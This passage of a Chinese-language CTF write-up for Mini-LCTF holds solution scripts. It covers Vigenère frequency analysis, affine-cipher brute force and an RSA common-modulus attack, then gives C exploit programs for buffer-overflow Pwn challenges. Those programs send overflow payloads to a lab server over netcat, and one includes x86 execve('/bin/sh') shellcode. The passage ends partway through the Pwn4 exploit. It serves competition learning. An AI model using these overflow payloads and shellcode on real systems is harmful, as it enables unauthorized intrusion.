class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">import string</div><div class="line">Alphabet_boom=[0.082,0.015,0.028,0.043,0.127,0.022,0.020,0.061,0.070,0.002,0.008,0.040,0.024,0.067,0.075,0.019,0.001,0.060,0.063,0.091,0.028,0.010,0.023,0.001,0.020,0.001]</div><div class="line"></div><div class="line">def confram(sec_msg,lenth,word):</div><div class="line">	Ic=[0 for i in range(lenth)]</div><div class="line"></div><div class="line"></div><div class="line">	for con in xrange(lenth):</div><div class="line">		f=[0.0 for i in range(26)]</div><div class="line"></div><div class="line">		for i in xrange(len(word[con])):#统计频数</div><div class="line">			f[ord(word[con][i])-ord(&quot;a&quot;)]+=1</div><div class="line"></div><div class="line">		tem=0.0</div><div class="line">		for i in xrange(26):</div><div class="line">			if f[i] &lt;1:</div><div class="line">				pass</div><div class="line">			else:</div><div class="line">				tem+=f[i]*(f[i]-1)</div><div class="line">		Ic[con]=tem/(len(word[con])*(len(word[con])-1))</div><div class="line"></div><div class="line">	temp_=0.0</div><div class="line">	for x in Ic:</div><div class="line">		temp_+=x</div><div class="line">	if temp_&gt;=0.065*lenth:</div><div class="line">		return True</div><div class="line">	else:</div><div class="line">		return False</div><div class="line"></div><div class="line">#	print &quot;Expectation: 0.065601\nIc =&quot;,</div><div class="line"></div><div class="line"></div><div class="line">def boom(sec_msg,lenth,word):</div><div class="line">	Mg=[[0.0 for i in xrange(26)] for j in xrange(lenth)]</div><div class="line">	#遍历key分组lenth</div><div class="line">	for group in xrange(lenth):</div><div class="line">		#统计频数</div><div class="line">		f=[0.0 for i in xrange(26)]</div><div class="line">		for i in xrange(len(word[group])):</div><div class="line">			f[ord(word[group][i])-ord(&quot;a&quot;)]+=1</div><div class="line">		#遍历分组内key26</div><div class="line">		for key in xrange(26):</div><div class="line">			#遍历word内第lenth个分组字符串，计算 Mg[lenth][key26]=累加fp/n&apos;</div><div class="line">			for each in xrange(26):</div><div class="line">				Mg[group][key]+=f[(each+key)%26]*Alphabet_boom[each]/len(word[group])</div><div class="line">	key=&quot;&quot;</div><div class="line">	for i in xrange(lenth):</div><div class="line">		max_=max(Mg[i])</div><div class="line">		if max_&lt;0.05:</div><div class="line">			print &quot;none!&quot;</div><div class="line">			key+=&quot; &quot;</div><div class="line">			continue</div><div class="line"></div><div class="line">		temp=[]</div><div class="line">		for j in xrange(26):</div><div class="line">			if Mg[i][j]==max_:</div><div class="line">				temp.append(chr(j+ord(&quot;a&quot;)))</div><div class="line">				print chr(j+ord(&quot;a&quot;)),</div><div class="line">				print &apos;----------&gt;&apos;,</div><div class="line">				print Mg[i][j]</div><div class="line">		if len(temp)!=1:</div><div class="line">			key+=&apos;(&apos;+&apos;&apos;.join(temp)+&apos;)&apos;</div><div class="line">		else:</div><div class="line">			key+=temp[0]</div><div class="line">	print &quot;key&gt;&gt;&quot;,key</div><div class="line"></div><div class="line">def chzsStep1(lenth, sec_msg):</div><div class="line">	word=[&quot;&quot; for i in range(lenth)]</div><div class="line">	for i in xrange(len(sec_msg)):</div><div class="line">		word[i%lenth]+=sec_msg[i]#按key长分组</div><div class="line"></div><div class="line">	return confram(sec_msg,lenth,word)</div><div class="line"></div><div class="line">def chzsStep2(lenth, sec_msg):</div><div class="line">	word=[&quot;&quot; for i in range(lenth)]</div><div class="line">	for i in xrange(len(sec_msg)):</div><div class="line">		word[i%lenth]+=sec_msg[i]#按key长分组</div><div class="line">	boom(sec_msg,lenth,word)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">	chzs()</div></pre></td></tr></table></figure>
+<hr>
+<p><strong>veryEasy</strong></p>
+<p>Description:</p>
+<p> 很简单的算法，干掉它。</p>
+<p>注：encrypted在代码最下一行</p>
+<p>File:  verryEasy.py</p>
+<p>WriteUp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">m=<span class="string">"74f648f64bc9d517d1de584358ed903ffa54e503e53f58ed479854fa94e5ed9898fa544747eded58439434"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(a,b,m)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">""</span>.join(map(chr,map(<span class="keyword">lambda</span> x: (x*a+b)%<span class="number">251</span>,map(ord,m.decode(<span class="string">'hex'</span>)))))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">255</span>):</div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">255</span>):</div><div class="line">		<span class="keyword">if</span> <span class="string">"Mini-LCTF"</span> <span class="keyword">in</span> process(i,j,m):</div><div class="line">			<span class="keyword">print</span> process(i,j,m)</div></pre></td></tr></table></figure>
+<hr>
+<p><strong>rsa200&amp;rsa300</strong></p>
+<p>File:</p>
+<p>rsa200.py</p>
+<p>rsa300.py</p>
+<p>WriteUp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</div><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exEuc</span><span class="params">(a, b)</span>:</span></div><div class="line">	x = [<span class="number">1</span>, <span class="number">0</span>, a]</div><div class="line">	y = [<span class="number">0</span>, <span class="number">1</span>, b]</div><div class="line">	<span class="keyword">while</span> y[<span class="number">2</span>]!=<span class="number">0</span>:</div><div class="line">		Q = x[<span class="number">2</span>]/y[<span class="number">2</span>]</div><div class="line">		temp = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">			temp[i] = x[i] - y[i]*Q</div><div class="line">			x[i] = y[i]</div><div class="line">			y[i] = temp[i]</div><div class="line">	<span class="keyword">return</span> x</div><div class="line">		</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashBoom</span><span class="params">(s, num)</span>:</span></div><div class="line">	<span class="keyword">print</span> s</div><div class="line">	<span class="keyword">if</span> num == <span class="number">200</span>:</div><div class="line">		str_ = <span class="string">"123456"</span></div><div class="line">	<span class="keyword">elif</span> num == <span class="number">300</span>:</div><div class="line">		str_ = <span class="string">"654321"</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1000000</span>):</div><div class="line">		<span class="keyword">if</span> str_ <span class="keyword">in</span> sha256(s + str(x)).hexdigest():</div><div class="line">			z = sha256(s + str(x)).digest()</div><div class="line">			<span class="keyword">print</span> x</div><div class="line">			<span class="keyword">print</span> sha256(s + str(x)).hexdigest()</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">commonMode</span><span class="params">(c1, c2, e1, e2, n)</span>:</span></div><div class="line">	eucReturn = exEuc(e1, e2)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">		<span class="keyword">if</span> eucReturn[i]&lt;<span class="number">0</span>:</div><div class="line">			eucReturn[i] = -eucReturn[i]</div><div class="line">			<span class="keyword">if</span> i == <span class="number">0</span>:</div><div class="line">				c1 = inverse(c1, n)</div><div class="line">			<span class="keyword">elif</span> i == <span class="number">1</span>:</div><div class="line">				c2 = inverse(c2, n)</div><div class="line">	<span class="keyword">print</span> eucReturn</div><div class="line">	<span class="keyword">print</span> (eucReturn[<span class="number">0</span>]*e1 + eucReturn[<span class="number">1</span>]*e2)%n</div><div class="line">	<span class="keyword">print</span> hex((pow(c1, eucReturn[<span class="number">0</span>], n)*pow(c2, eucReturn[<span class="number">1</span>], n))%n)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>)</div><div class="line">			</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, d, n)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	num = <span class="number">200</span></div><div class="line">	timeStamp = <span class="string">'2016-12-01 09:11:42.964379'</span></div><div class="line">	hashBoom(timeStamp, num)</div><div class="line"></div><div class="line">	N = <span class="number">0xb903c6caa8f9e6bf0101c503c032aae6c788988a22160ed552aeee3fd63dcb6adfd1970ad70fee81590f305f629b5c923b31993c2014eac01b9e570dda0300c263b85c05cc608fb7969ec9f3a16c93f2712da0e30782ed295606af6c40832afa484aae2728d0b40a7ff48d1b05df85caf6115b31512497859d04bfda410ff993fe3007fbf76daabc3463a52db01bceae39352697353e6e20a9be690a0aaf747d0ed0fca99d62f411420831fd9e871ae443cbcbfc0080b9dcd7911e7e5b7a3f7a0ada84c1a7572c7a9f09bab18a5afff37bc48e29c8ee19b88c3e7b5a94f758703eff097b4a9b9cfcbc2baf65578551a4ce0886b7be527a6d3c51c22a85c88ffbL</span></div><div class="line">	e1 = <span class="number">0x43e1L</span></div><div class="line">	flag1 = <span class="number">0x1a3ac0337b1555fe35567d33cec1e553fbb9d19f469482b0aa62abc5de627f7c8b4a493d7b358e1faccf5239662c00811dd903e963b16d667000d08c001f91661e5a74c27eb9bb882aefb099e946afca28f3a81aee588f32c67fde2e21be1276ef7746024d4ed6ced7030591939c63432c335e0660048725c346e16f0071643fd4683c414b7b31aad76a2774cf54c3a9bb4b3487b9e7c5d66e160d6c3a76757a7b016d75d0bdef81a94e6271abacbbbb706ba7242061a78fcd569a141f2ed31500ed219ef0d12387bc9a3575a0bfe04c9a51394c51dc0b575df62e80d8320172145c0ff8f7383d7102bf54ef04384b6c19eea1ac94db77c254f02214cab550faL</span></div><div class="line">	e2 = <span class="number">0x75e5L</span></div><div class="line">	flag2 = <span class="number">0x64c7bd11cea73ec40a26e1c2c91eb2fcc31d56fc4460bbf58967c08cbda4b2ec2aadf7cde2da106a25ff1916c42aeaf71b4ece5240a7a897189d4352b04e6165cb2788244b2538629384a95a826c517c84d676231e7e3db117b5c32536db5f276e84c5a9f63c23e8e1b8b5c2920a490da053956b5e5e95d3c698e5d72f7470451764a3da20e6286429077169b2a116ac3416e0a6fb3bfb19ef5f2960573f9b8d22b4a5615a96c4c5841d449d64a1fd91576946eb97ebe3af6382350806bbf99c49f6740884fbe4047e089d0773eee6de570355f8f14deb0888b2a76e96740f47cd5f1cdf537b1938e3fb478a8eed1fe34eebf714849da3419a8d9a66aed28247L</span></div><div class="line">	commonMode(flag1, flag2, e1, e2, N)</div><div class="line"></div><div class="line">	</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
+<h2 id="0x06-Pwn"><a href="#0x06-Pwn" class="headerlink" title="0x06 Pwn"></a>0x06 Pwn</h2><p><strong>Pwn1</strong></p>
+<p>File: pwn1</p>
+<p>WriteUp:</p>
+<p>直接溢出即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">init_connect</span><span class="params">()</span> &#123;</div><div class="line">        <span class="keyword">char</span> *arg[<span class="number">4</span>] = &#123;<span class="string">"/bin/cat"</span>, <span class="string">"10.170.55.102"</span>, <span class="string">"2333"</span>, <span class="literal">NULL</span>&#125;;</div><div class="line">        execve(<span class="string">"/bin/netcat"</span>, arg, <span class="literal">NULL</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">write_payload</span><span class="params">(<span class="keyword">int</span> fd)</span> &#123;</div><div class="line">        <span class="keyword">char</span>    payload[<span class="number">0x30</span>] = <span class="string">"AAAAAAAAAAAAAAAAAAAAAA"</span>;</div><div class="line">        write(fd, payload, <span class="built_in">strlen</span>(payload));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> &#123;</div><div class="line">        <span class="keyword">int</span>     fd[<span class="number">2</span>];</div><div class="line">        <span class="keyword">pid_t</span>   pid;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (pipe(fd) &lt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"pipe error"</span>);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"fork error"</span>);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="comment">/* parent */</span></div><div class="line">                close(fd[<span class="number">0</span>]);</div><div class="line">                write_payload(fd[<span class="number">1</span>]);</div><div class="line"></div><div class="line">                <span class="comment">/* simulate command "cat" */</span></div><div class="line">                close(fd[<span class="number">1</span>]);</div><div class="line"></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">/* child */</span></div><div class="line">                close(fd[<span class="number">1</span>]);</div><div class="line">                dup2(fd[<span class="number">0</span>], <span class="number">0</span>);</div><div class="line"></div><div class="line">                init_connect();</div><div class="line"></div><div class="line">                close(fd[<span class="number">0</span>]);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://ww3.sinaimg.cn/large/006tT0yqjw1fb01ahvws7j31kw02tdgh.jpg" alt=""></p>
+<hr>
+<p><strong>Pwn2</strong></p>
+<p>File: pwn2</p>
+<p>WriteUp:</p>
+<p>直接溢出，绕过if语句即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">init_connect</span><span class="params">()</span> &#123;</div><div class="line">        <span class="keyword">char</span> *arg[<span class="number">4</span>] = &#123;<span class="string">"/bin/cat"</span>, <span class="string">"10.170.55.102"</span>, <span class="string">"2334"</span>, <span class="literal">NULL</span>&#125;;</div><div class="line">        execve(<span class="string">"/bin/netcat"</span>, arg, <span class="literal">NULL</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">write_payload</span><span class="params">(<span class="keyword">int</span> fd)</span> &#123;</div><div class="line">        <span class="keyword">char</span>    payload[<span class="number">0x14</span>] = <span class="string">"Icemakr__@_xd5ec"</span>;</div><div class="line">        write(fd, payload, <span class="built_in">strlen</span>(payload));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> &#123;</div><div class="line">        <span class="keyword">int</span>     fd[<span class="number">2</span>];</div><div class="line">        <span class="keyword">pid_t</span>   pid;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (pipe(fd) &lt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"pipe error"</span>);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"fork error"</span>);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="comment">/* parent */</span></div><div class="line">                close(fd[<span class="number">0</span>]);</div><div class="line">                write_payload(fd[<span class="number">1</span>]);</div><div class="line"></div><div class="line">                <span class="comment">/* simulate command "cat" */</span></div><div class="line">                close(fd[<span class="number">1</span>]);</div><div class="line"></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">/* child */</span></div><div class="line">                close(fd[<span class="number">1</span>]);</div><div class="line">                dup2(fd[<span class="number">0</span>], <span class="number">0</span>);</div><div class="line"></div><div class="line">                init_connect();</div><div class="line"></div><div class="line">                close(fd[<span class="number">0</span>]);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://ww4.sinaimg.cn/large/006tT0yqjw1fb01arip93j31kw03l3zd.jpg" alt=""></p>
+<hr>
+<p><strong>Pwn3</strong></p>
+<p>File: pwn3</p>
+<p>WriteUp:</p>
+<p>直接溢出覆盖函数返回地址跳转到luck函数即可getshell</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">void</div><div class="line">init_connect() &#123;</div><div class="line">        char *arg[4] = &#123;"/bin/cat", "10.170.55.102", "2335", NULL&#125;;</div><div class="line">        execve("/bin/netcat", arg, NULL);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void</div><div class="line">write_payload(int fd) &#123;</div><div class="line">        char    payload[0x14] = "AAAABBBBCCCCDDDD\xfd\x84\x04\x08";</div><div class="line">        write(fd, payload, 0x14);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void</div><div class="line">interact(int fd) &#123;</div><div class="line">        int     count = 0;</div><div class="line">        char    command[0x100];</div><div class="line"></div><div class="line">        while (1) &#123;</div><div class="line">                count = 0;</div><div class="line">                memset(command, '\x00', 0x100);</div><div class="line">                while (1) &#123;</div><div class="line">                        read(0, command + count, 0x1);</div><div class="line">                        if (command[count] == '\n' || count &gt;= 0xfe) &#123;</div><div class="line">                                break;</div><div class="line">                        &#125;</div><div class="line">                        count++;</div><div class="line">                &#125;</div><div class="line">                command[0xff] = '\x00';</div><div class="line">                write(fd, command, strlen(command));</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int</div><div class="line">main(void) &#123;</div><div class="line">        int     fd[2];</div><div class="line">        pid_t   pid;</div><div class="line"></div><div class="line">        if (pipe(fd) &lt; 0) &#123;</div><div class="line">                printf("pipe error");</div><div class="line">                exit(1);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if ((pid = fork()) &lt; 0) &#123;</div><div class="line">                printf("fork error");</div><div class="line">                exit(1);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (pid &gt; 0) &#123;</div><div class="line">                /* parent */</div><div class="line">                close(fd[0]);</div><div class="line">                write_payload(fd[1]);</div><div class="line"></div><div class="line">                interact(fd[1]);</div><div class="line">                /* simulate command "cat" */</div><div class="line">                close(fd[1]);</div><div class="line"></div><div class="line">        &#125; else &#123;</div><div class="line">                /* child */</div><div class="line">                close(fd[1]);</div><div class="line">                dup2(fd[0], 0);</div><div class="line"></div><div class="line">                init_connect();</div><div class="line"></div><div class="line">                close(fd[0]);</div><div class="line">                exit(0);</div><div class="line">        &#125;</div><div class="line">        exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://ww3.sinaimg.cn/large/006tT0yqjw1fb01af3dn1j31kw042js9.jpg" alt=""></p>
+<hr>
+<p><strong>Pwn4</strong></p>
+<p>File: pwn4</p>
+<p>WriteUp:</p>
+<p>直接溢出跳到数据段上预先存放好的shellcode处即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">BITS 32</div><div class="line"></div><div class="line">_start:</div><div class="line">    jmp test1</div><div class="line"></div><div class="line">test:</div><div class="line">    pop ebx</div><div class="line">    mov BYTE [ebx + 0x7], al</div><div class="line">    mov DWORD [ebx + 0x8], ebx</div><div class="line">    mov DWORD [ebx + 0xc], eax</div><div class="line">    lea ecx, [ebx + 0x8]</div><div class="line">    xor edx, edx</div><div class="line">    mov al, 0xb</div><div class="line">    int 0x80</div><div class="line"></div><div class="line">test1:</div><div class="line">    xor eax,eax</div><div class="line">    call test</div><div class="line">    db &apos;/bin/shA&apos;, 0x00</div></pre></td></tr></table></figure></p>
+<p><code>nasm shellcode.asm</code>编译shellcode</p>
+<p>Exploit</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">void</div><div class="line">init_connect() &#123;</div><div class="line">        char *arg[4] = &#123;"/bin/cat", "10.170.55.102", "2336", NULL&#125;;</div><div class="line">        //execve("/bin/netcat", arg, NULL);</div><div class="line">        execve("./pwn4", arg, NULL);</div><div class="line">&#125;</div><div class="line"></div><div class="line">char *</div><div class="line">get_shellcode() &#123;</div><div class="line">        FILE *f;</div><div class="line">        int c;</div><div 